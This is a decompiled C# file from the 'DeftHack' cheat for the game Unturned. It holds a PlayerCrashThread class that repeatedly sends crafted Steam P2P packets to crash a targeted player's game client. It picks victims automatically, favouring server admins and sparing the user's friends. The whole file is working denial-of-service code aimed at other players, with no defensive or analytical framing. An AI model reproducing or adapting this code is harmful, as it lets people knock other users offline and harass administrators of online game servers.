using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using DeftHack.Attributes;
using DeftHack.Utilities;
using DeftHack.Variables;
using SDG.Unturned;
using Steamworks;

namespace DeftHack.Threads
{
	// Token: 0x02000034 RID: 52
	public static class PlayerCrashThread
	{
		// Token: 0x060000C4 RID: 196 RVA: 0x00008A6C File Offset: 0x00006C6C
		[Thread]
		public static void Start()
		{
			for (;;)
			{
				while (!Provider.isConnected || Provider.isLoading || !OptimizationVariables.MainPlayer)
				{
					Thread.Sleep(500);
				}
				SteamChannel channel = OptimizationVariables.MainPlayer.input.channel;
				byte b = (byte)channel.getCall("askInput");
				byte[] array = new byte[]
				{
					20,
					b,
					byte.MaxValue
				};
				uint cubData = (uint)array.Length;
				int id = channel.id;
				while (Provider.isConnected)
				{
					bool flag = PlayerCrashThread.CrashTarget != CSteamID.Nil;
					bool flag2 = flag;
					if (flag2)
					{
						SteamNetworking.SendP2PPacket(PlayerCrashThread.CrashTarget, array, cubData, EP2PSend.k_EP2PSendUnreliableNoDelay, id);
					}
					else
					{
						Thread.Sleep(500);
					}
				}
			}
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x00008B44 File Offset: 0x00006D44
		[Thread]
		public static void CheckThread()
		{
			for (;;)
			{
				List<SteamPlayer> clients = Provider.clients.ToList<SteamPlayer>();
				bool flag = clients.All((SteamPlayer p) => PlayerCrashThread.CrashTarget != p.playerID.steamID);
				bool flag2 = flag;
				if (flag2)
				{
					bool flag3 = PlayerCrashThread.ContinuousPlayerCrash && clients.Count > 1;
					bool flag4 = flag3;
					if (flag4)
					{
						SteamPlayer steamPlayer = (from p in clients
						orderby p.isAdmin ? 0 : 1
						select p).FirstOrDefault((SteamPlayer p) => p.playerID.steamID != PlayerCrashThread.CrashTarget && !FriendUtilities.IsFriendly(p.player));
						CSteamID? csteamID = (steamPlayer != null) ? new CSteamID?(steamPlayer.playerID.steamID) : null;
						bool flag5 = csteamID != null;
						bool flag6 = flag5;
						if (flag6)
						{
							PlayerCrashThread.CrashTarget = csteamID.Value;
						}
					}
					else
					{
						PlayerCrashThread.CrashTarget = PlayerCrashThread.CrashTargets.FirstOrDefault((CSteamID c) => clients.Any((SteamPlayer p) => p.playerID.steamID == c));
					}
				}
				Thread.Sleep(500);
			}
		}

		// Token: 0x04000075 RID: 117
		public static bool ContinuousPlayerCrash;

		// Token: 0x04000076 RID: 118
		public static List<CSteamID> CrashTargets = new List<CSteamID>();

		// Token: 0x04000077 RID: 119
		public static CSteamID CrashTarget;
	}
}
